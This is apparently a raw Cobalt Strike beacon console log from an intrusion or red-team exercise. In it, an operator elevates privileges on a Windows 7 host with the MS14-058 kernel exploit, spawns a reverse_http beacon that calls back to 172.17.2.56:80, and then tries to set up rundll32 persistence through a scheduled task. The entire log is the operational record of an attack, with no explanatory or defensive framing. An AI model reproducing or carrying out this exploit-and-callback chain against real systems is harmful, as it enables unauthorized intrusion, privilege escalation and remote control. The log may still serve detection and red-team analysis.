03/03 16:24:00 [metadata] 172.17.2.54 <- 172.17.2.54; computer: A-PC; user: a; pid: 44364; os: Windows; version: 6.1; beacon arch: x86 (x64)
03/03 16:24:23 [input] <neo> elevate ms14-058 test
03/03 16:24:24 [task] Tasked beacon to run windows/beacon_http/reverse_http (172.17.2.56:80) via ms14-058
03/03 16:24:52 [checkin] host called home, sent: 104503 bytes
03/03 16:24:54 [output]
received output:
[*] Getting Windows version...
[*] Solving symbols...
[*] Requesting Kernel loaded modules...
[*] pZwQuerySystemInformation required length 43816
[*] Parsing SYSTEM_INFO...
[*] 148 Kernel modules found
[*] Checking module \SystemRoot\system32\ntoskrnl.exe
[*] Good! nt found as ntoskrnl.exe at 0x03c59000
[*] ntoskrnl.exe loaded in userspace at: 40000000
[*] pPsLookupProcessByProcessId in kernel: 0xFFFFF80003FAC1FC
[*] pPsReferencePrimaryToken in kernel: 0xFFFFF80003FAF9D0
[*] Registering class...
[*] Creating window...
[*] Allocating null page...
[*] Getting PtiCurrent...
[*] Good! dwThreadInfoPtr 0xFFFFF900C275AC30
[*] Creating a fake structure at NULL...
[*] Triggering vulnerability...
[!] Executing payload...


03/03 16:25:14 [task] 计划任务运行rundll32
03/03 16:25:54 [checkin] host called home, sent: 175 bytes
03/03 16:25:54 [output]
received output:
错误: 系统找不到指定的文件。


03/03 16:25:54 [output]
received output:
警告: 因为 /ST 早于当前的时间，任务可能无法运行。
错误: 拒绝访问。


